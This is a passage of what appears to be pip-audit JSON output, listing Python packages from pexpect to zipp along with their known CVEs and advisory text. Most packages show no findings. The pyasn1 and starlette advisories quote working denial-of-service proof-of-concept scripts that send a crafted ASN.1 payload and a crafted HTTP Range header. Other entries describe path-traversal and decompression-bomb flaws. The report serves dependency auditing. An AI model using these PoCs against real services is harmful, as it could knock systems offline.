Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)  - **MITRE CWE References:**   - [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)   - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)  - **MITRE ATT&CK Techniques:**   - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)   - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)"}]}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "pfzy", "version": "0.3.4", "vulns": []}, {"name": "pi-heif", "version": "1.1.0", "vulns": []}, {"name": "pikepdf", "version": "9.10.2", "vulns": []}, {"name": "pillow", "version": "11.3.0", "vulns": []}, {"name": "pip", "version": "25.2", "vulns": [{"id": "CVE-2025-8869", "fix_versions": ["25.3"], "aliases": ["BIT-pip-2025-8869", "GHSA-4xh5-x5gv-qwph"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}, {"id": "CVE-2026-1703", "fix_versions": ["26.0"], "aliases": ["GHSA-6vgw-5pg2-w6jp"], "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "platformdirs", "version": "4.5.0", "vulns": []}, {"name": "plotly", "version": "6.5.2", "vulns": []}, {"name": "plotly-express", "version": "0.4.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "plumbum", "version": "1.9.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "portalocker", "version": "3.2.0", "vulns": []}, {"name": "prometheus-client", "version": "0.23.1", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.51", "vulns": []}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "proto-plus", "version": "1.26.1", "vulns": []}, {"name": "protobuf", "version": "5.29.5", "vulns": [{"id": "CVE-2026-0994", "fix_versions": ["6.33.5"], "aliases": ["GHSA-7gcm-g887-7qv7"], "description": "A denial-of-service (DoS) vulnerability exists in google.protobuf.json_format.ParseDict() in Python, where the max_recursion_depth limit can be bypassed when parsing nested google.protobuf.Any messages.  Due to missing recursion depth accounting inside the internal Any-handling logic, an attacker can supply deeply nested Any structures that bypass the intended recursion limit, eventually exhausting Python\u2019s recursion stack and causing a RecursionError."}]}, {"name": "psmv", "skip_reason": "Dependency not found on PyPI and could not be audited: psmv (0.1.0)"}, {"name": "psutil", "version": "7.1.0", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "py2store", "version": "0.1.22", "vulns": []}, {"name": "pyarrow", "version": "23.0.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": [{"id": "CVE-2026-23490", "fix_versions": ["0.6.2"], "aliases": ["GHSA-63vm-454h-vhhq"], "description": "### Summary  After reviewing pyasn1 v0.6.1 a Denial-of-Service issue has been found that leads to memory exhaustion from malformed RELATIVE-OID with excessive continuation octets.  ### Details  The integer issue can be found in the decoder as `reloid += ((subId << 7) + nextSubId,)`: https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496  ### PoC  For the DoS: ```py import pyasn1.codec.ber.decoder as decoder import pyasn1.type.univ as univ import sys import resource  # Deliberately set memory limit to display PoC try:     resource.setrlimit(resource.RLIMIT_AS, (100*1024*1024, 100*1024*1024))     print(\"[*] Memory limit set to 100MB\") except:     print(\"[-] Could not set memory limit\")  # Test with different payload sizes to find the DoS threshold payload_size_mb = int(sys.argv[1])  print(f\"[*] Testing with {payload_size_mb}MB payload...\")  payload_size = payload_size_mb * 1024 * 1024 # Create payload with continuation octets # Each 0x81 byte indicates continuation, causing bit shifting in decoder payload = b'\\x81' * payload_size + b'\\x00' length = len(payload)  # DER length encoding (supports up to 4GB) if length < 128:     length_bytes = bytes([length]) elif length < 256:     length_bytes = b'\\x81' + length.to_bytes(1, 'big') elif length < 256**2:     length_bytes = b'\\x82' + length.to_bytes(2, 'big') elif length < 256**3:     length_bytes = b'\\x83' + length.to_bytes(3, 'big') else:     # 4 bytes can handle up to 4GB     length_bytes = b'\\x84' + length.to_bytes(4, 'big')  # Use OID (0x06) for more aggressive parsing malicious_packet = b'\\x06' + length_bytes + payload  print(f\"[*] Packet size: {len(malicious_packet) / 1024 / 1024:.1f} MB\")  try:     print(\"[*] Decoding (this may take time or exhaust memory)...\")     result = decoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())      print(f'[+] Decoded successfully')     print(f'[!] Object size: {sys.getsizeof(result[0])} bytes')      # Try to convert to string     print('[*] Converting to string...')     try:         str_result = str(result[0])         print(f'[+] String succeeded: {len(str_result)} chars')         if len(str_result) > 10000:             print(f'[!] MEMORY EXPLOSION: {len(str_result)} character string!')     except MemoryError:         print(f'[-] MemoryError during string conversion!')     except Exception as e:         print(f'[-] {type(e).__name__} during string conversion')  except MemoryError:     print('[-] MemoryError: Out of memory!') except Exception as e:     print(f'[-] Error: {type(e).__name__}: {e}')   print(\"\\n[*] Test completed\") ```   Screenshots with the results:  #### DoS <img width=\"944\" height=\"207\" alt=\"Screenshot_20251219_160840\" src=\"https://github.com/user-attachments/assets/68b9566b-5ee1-47b0-a269-605b037dfc4f\" />  <img width=\"931\" height=\"231\" alt=\"Screenshot_20251219_152815\" src=\"https://github.com/user-attachments/assets/62eacf4f-eb31-4fba-b7a8-e8151484a9fa\" />  #### Leak analysis  A potential heap leak was investigated but came back clean: ``` [*] Creating 1000KB payload... [*] Decoding with pyasn1... [*] Materializing to string... [+] Decoded 2157784 characters [+] Binary representation: 896001 bytes [+] Dumped to heap_dump.bin  [*] First 64 bytes (hex):   01020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081  [*] First 64 bytes (ASCII/hex dump):   0000: 01 02 04 08 10 20 40 81 02 04 08 10 20 40 81 02  ..... @..... @..   0010: 04 08 10 20 40 81 02 04 08 10 20 40 81 02 04 08  ... @..... @....   0020: 10 20 40 81 02 04 08 10 20 40 81 02 04 08 10 20  . @..... @.....    0030: 40 81 02 04 08 10 20 40 81 02 04 08 10 20 40 81  @..... @..... @.  [*] Digit distribution analysis:   '0':  10.1%   '1':   9.9%   '2':  10.0%   '3':   9.9%   '4':   9.9%   '5':  10.0%   '6':  10.0%   '7':  10.0%   '8':   9.9%   '9':  10.1% ```  ### Scenario  1. An attacker creates a malicious X.509 certificate. 2. The application validates certificates. 3. The application accepts the malicious certificate and tries decoding resulting in the issues mentioned above.  ### Impact  This issue can affect resource consumption and hang systems or stop services. This may affect: - LDAP servers - TLS/SSL endpoints - OCSP responders - etc.  ### Recommendation  Add a limit to the allowed bytes in the decoder."}]}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pycairo", "version": "1.29.0", "vulns": []}, {"name": "pycountry", "version": "24.6.1", "vulns": []}, {"name": "pycparser", "version": "2.22", "vulns": []}, {"name": "pydantic", "version": "2.11.7", "vulns": []}, {"name": "pydantic-core", "version": "2.33.2", "vulns": []}, {"name": "pydantic-settings", "version": "2.12.0", "vulns": []}, {"name": "pydub", "version": "0.25.1", "vulns": []}, {"name": "pyglet", "version": "2.1.11", "vulns": []}, {"name": "pyglm", "version": "2.8.3", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pymupdf", "version": "1.26.6", "vulns": []}, {"name": "pynacl", "version": "1.6.0", "vulns": [{"id": "CVE-2025-69277", "fix_versions": ["1.6.2"], "aliases": ["GHSA-mrfv-m5wm-5w6w"], "description": "libsodium before ad3004e, in atypical use cases involving certain custom cryptography or untrusted data to crypto_core_ed25519_is_valid_point, mishandles checks for whether an elliptic curve point is valid because it sometimes allows points that aren't in the main cryptographic group.  This advisoory lists packages in the GitHub Advisory Database's [supported ecosystems](https://github.com/github/advisory-database?tab=readme-ov-file#supported-ecosystems) that are affected by this vulnerability due to a vulnerable dependency."}]}, {"name": "pyobjc-core", "version": "12.1", "vulns": []}, {"name": "pyobjc-framework-cocoa", "version": "12.1", "vulns": []}, {"name": "pypandoc", "version": "1.15", "vulns": []}, {"name": "pyparsing", "version": "3.2.3", "vulns": []}, {"name": "pypdf", "version": "6.1.3", "vulns": [{"id": "CVE-2025-66019", "fix_versions": ["6.4.0"], "aliases": ["GHSA-m449-cwjh-6pw7"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to a memory usage of up to 1 GB per stream. This requires parsing the content stream of a page using the LZWDecode filter.  This is a follow up to [GHSA-jfx9-29x2-rv3j](https://github.com/py-pdf/pypdf/security/advisories/GHSA-jfx9-29x2-rv3j) to align the default limit with the one for *zlib*.  ### Patches This has been fixed in [pypdf==6.4.0](https://github.com/py-pdf/pypdf/releases/tag/6.4.0).  ### Workarounds If users cannot upgrade yet, use the line below to overwrite the default in their code:  ```python pypdf.filters.LZW_MAX_OUTPUT_LENGTH = 75_000_000 ```"}, {"id": "CVE-2026-22690", "fix_versions": ["6.6.0"], "aliases": ["GHSA-4xc4-762w-m6cg"], "description": "### Impact An attacker who exploits this vulnerability can craft a PDF which leads to possibly long runtimes for actually invalid files. This can be achieved by omitting the `/Root` entry in the trailer, while using a rather large `/Size` value. Only the non-strict reading mode is affected.  ### Patches This has been fixed in [pypdf==6.6.0](https://github.com/py-pdf/pypdf/releases/tag/6.6.0).  ### Workarounds  ```python from pypdf import PdfReader, PdfWriter   # Instead of reader = PdfReader(\"file.pdf\") # use the strict mode: reader = PdfReader(\"file.pdf\", strict=True)  # Instead of writer = PdfWriter(clone_from=\"file.pdf\") # use an explicit strict reader: writer = PdfWriter(clone_from=PdfReader(\"file.pdf\", strict=True)) ```  ### Resources This issue has been fixed in #3594."}, {"id": "CVE-2026-22691", "fix_versions": ["6.6.0"], "aliases": ["GHSA-4f6g-68pf-7vhv"], "description": "### Impact An attacker who exploits this vulnerability can craft a PDF which leads to possibly long runtimes for invalid `startxref` entries. When rebuilding the cross-reference table, PDF files with lots of whitespace characters become problematic. Only the non-strict reading mode is affected.  ### Patches This has been fixed in [pypdf==6.6.0](https://github.com/py-pdf/pypdf/releases/tag/6.6.0).  ### Workarounds  ```python from pypdf import PdfReader, PdfWriter   # Instead of reader = PdfReader(\"file.pdf\") # use the strict mode: reader = PdfReader(\"file.pdf\", strict=True)  # Instead of writer = PdfWriter(clone_from=\"file.pdf\") # use an explicit strict reader: writer = PdfWriter(clone_from=PdfReader(\"file.pdf\", strict=True)) ```  ### Resources This issue has been fixed in #3594."}, {"id": "CVE-2026-24688", "fix_versions": ["6.6.2"], "aliases": ["GHSA-2q4j-m29v-hq73"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires accessing the outlines/bookmarks.  ### Patches  This has been fixed in [pypdf 6.6.2](https://github.com/py-pdf/pypdf/releases/tag/6.6.2).  ### Workarounds  If projects cannot upgrade yet, consider applying the changes from PR [#3610](https://github.com/py-pdf/pypdf/pull/3610)."}]}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pyright", "version": "1.1.408", "vulns": []}, {"name": "pytablewriter", "version": "1.2.1", "vulns": []}, {"name": "pytesseract", "version": "0.3.13", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-asyncio", "version": "1.2.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.1.1", "vulns": []}, {"name": "python-frontmatter", "version": "1.1.0", "vulns": []}, {"name": "python-json-logger", "version": "4.0.0", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": [{"id": "CVE-2026-24486", "fix_versions": ["0.0.22"], "aliases": ["GHSA-wp53-j4wj-2cfg"], "description": "### Summary  A Path Traversal vulnerability exists when using non-default configuration options `UPLOAD_DIR` and `UPLOAD_KEEP_FILENAME=True`. An attacker can write uploaded files to arbitrary locations on the filesystem by crafting a malicious filename.  ### Details  When `UPLOAD_DIR` is set and `UPLOAD_KEEP_FILENAME` is `True`, the library constructs the file path using `os.path.join(file_dir, fname)`. Due to the behavior of `os.path.join()`, if the filename begins with a `/`, all preceding path components are discarded:  ```py os.path.join(\"/upload/dir\", \"/etc/malicious\") == \"/etc/malicious\" ```                          This allows an attacker to bypass the intended upload directory and write files to arbitrary paths.                                                                                                                                                                                         #### Affected Configuration                                                                                                                                                                                                                                                                      Projects are only affected if all of the following are true:                                                                                      - `UPLOAD_DIR` is set - `UPLOAD_KEEP_FILENAME` is set to True - The uploaded file exceeds `MAX_MEMORY_FILE_SIZE` (triggering a flush to disk)  The default configuration is not vulnerable.                                                                                                                                                                                                                                                #### Impact                                                                                                                                                                                                                                                                                   Arbitrary file write to attacker-controlled paths on the filesystem.                                                                                                                                                                                                                        #### Mitigation                                                                                                                                                                                                                                                                                  Upgrade to version 0.0.22, or avoid using `UPLOAD_KEEP_FILENAME=True` in project configurations."}]}, {"name": "python-telegram-bot", "version": "22.6", "vulns": []}, {"name": "pytokens", "version": "0.2.0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyzmq", "version": "27.1.0", "vulns": []}, {"name": "referencing", "version": "0.36.2", "vulns": []}, {"name": "regex", "version": "2025.9.18", "vulns": []}, {"name": "requests", "version": "2.32.4", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986-validator", "version": "0.1.1", "vulns": []}, {"name": "rfc3987-syntax", "version": "1.1.0", "vulns": []}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rouge-score", "version": "0.1.2", "vulns": []}, {"name": "rpds-py", "version": "0.27.1", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "ruff", "version": "0.15.0", "vulns": []}, {"name": "rv-toolkit", "skip_reason": "Dependency not found on PyPI and could not be audited: rv-toolkit (0.1.0)"}, {"name": "s3fs", "version": "2025.5.1", "vulns": []}, {"name": "s3transfer", "version": "0.14.0", "vulns": []}, {"name": "sacrebleu", "version": "2.6.0", "vulns": []}, {"name": "sae-lens", "version": "6.30.1", "vulns": []}, {"name": "safehttpx", "version": "0.1.7", "vulns": []}, {"name": "safetensors", "version": "0.6.2", "vulns": []}, {"name": "schedule", "version": "1.2.2", "vulns": []}, {"name": "scikit-learn", "version": "1.7.2", "vulns": []}, {"name": "scipy", "version": "1.16.1", "vulns": []}, {"name": "screeninfo", "version": "0.8.1", "vulns": []}, {"name": "seaborn", "version": "0.13.2", "vulns": []}, {"name": "semantic-version", "version": "2.10.0", "vulns": []}, {"name": "semver", "version": "3.0.4", "vulns": []}, {"name": "send2trash", "version": "1.8.3", "vulns": []}, {"name": "sentence-transformers", "version": "5.1.2", "vulns": []}, {"name": "sentencepiece", "version": "0.2.1", "vulns": []}, {"name": "sentry-sdk", "version": "2.50.0", "vulns": []}, {"name": "setfit", "version": "1.1.3", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "sgmllib3k", "version": "1.0.0", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "shortuuid", "version": "1.0.13", "vulns": []}, {"name": "simple-parsing", "version": "0.1.8", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "skia-pathops", "version": "0.9.1", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "smolagents", "version": "1.24.0", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.8", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.46", "vulns": []}, {"name": "sqlite-vec", "version": "0.1.6", "vulns": []}, {"name": "srt", "version": "3.5.3", "vulns": []}, {"name": "sse-starlette", "version": "3.0.3", "vulns": []}, {"name": "stack-data", "version": "0.6.3", "vulns": []}, {"name": "standardwebhooks", "version": "1.0.0", "vulns": []}, {"name": "starlette", "version": "0.46.2", "vulns": [{"id": "CVE-2025-54121", "fix_versions": ["0.47.2"], "aliases": ["GHSA-2c2j-9gv5-cj73"], "description": "### Summary When parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.  ### Details Please see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.  ```python      @property     def _in_memory(self) -> bool:         # check for SpooledTemporaryFile._rolled         rolled_to_disk = getattr(self.file, \"_rolled\", True)         return not rolled_to_disk      async def write(self, data: bytes) -> None:         if self.size is not None:             self.size += len(data)          if self._in_memory:             self.file.write(data)         else:             await run_in_threadpool(self.file.write, data) ```  I have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962   ### PoC See the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.  ### Impact To be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact."}, {"id": "CVE-2025-62727", "fix_versions": ["0.49.1"], "aliases": ["GHSA-7f5h-v6xp-fcq8"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}]}, {"name": "statsmodels", "version": "0.14.6", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "svgelements", "version": "1.9.6", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tabledata", "version": "1.3.4", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tblib", "version": "3.2.2", "vulns": []}, {"name": "tcolorpy", "version": "0.1.7", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "termcolor", "version": "2.3.0", "vulns": []}, {"name": "terminado", "version": "0.18.1", "vulns": []}, {"name": "textual", "version": "7.3.0", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tiktoken", "version": "0.12.0", "vulns": []}, {"name": "tinycss2", "version": "1.4.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "torch", "version": "2.9.1", "vulns": []}, {"name": "torchvision", "version": "0.24.1", "vulns": []}, {"name": "tornado", "version": "6.5.2", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformer-lens", "version": "2.17.0", "vulns": []}, {"name": "transformers", "version": "4.57.0", "vulns": []}, {"name": "transformers-stream-generator", "version": "0.0.5", "vulns": []}, {"name": "trl", "version": "0.27.0", "vulns": []}, {"name": "typeguard", "version": "4.4.4", "vulns": []}, {"name": "typepy", "version": "1.3.4", "vulns": []}, {"name": "typer", "version": "0.20.0", "vulns": []}, {"name": "types-deprecated", "version": "1.3.1.20251101", "vulns": []}, {"name": "types-python-dateutil", "version": "2.9.0.20251008", "vulns": []}, {"name": "typing-extensions", "version": "4.14.1", "vulns": []}, {"name": "typing-inspection", "version": "0.4.1", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "tzlocal", "version": "5.3.1", "vulns": []}, {"name": "uc-micro-py", "version": "1.0.3", "vulns": []}, {"name": "universal-pathlib", "version": "0.3.8", "vulns": []}, {"name": "uri-template", "version": "1.3.0", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.5.0", "vulns": [{"id": "CVE-2025-66418", "fix_versions": ["2.6.0"], "aliases": ["GHSA-gm62-xv2j-4w53"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "CVE-2025-66471", "fix_versions": ["2.6.0"], "aliases": ["GHSA-2xpw-w6gg-jr37"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}, {"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "uvicorn", "version": "0.35.0", "vulns": []}, {"name": "wadler-lindig", "version": "0.1.7", "vulns": []}, {"name": "wandb", "version": "0.24.0", "vulns": []}, {"name": "watchdog", "version": "6.0.0", "vulns": []}, {"name": "wcwidth", "version": "0.2.13", "vulns": []}, {"name": "webcolors", "version": "24.11.1", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "werkzeug", "version": "3.1.5", "vulns": []}, {"name": "widgetsnbextension", "version": "4.0.14", "vulns": []}, {"name": "wrapt", "version": "1.17.3", "vulns": []}, {"name": "xxhash", "version": "3.6.0", "vulns": []}, {"name": "yarl", "version": "1.22.0", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}], "fixes": []}
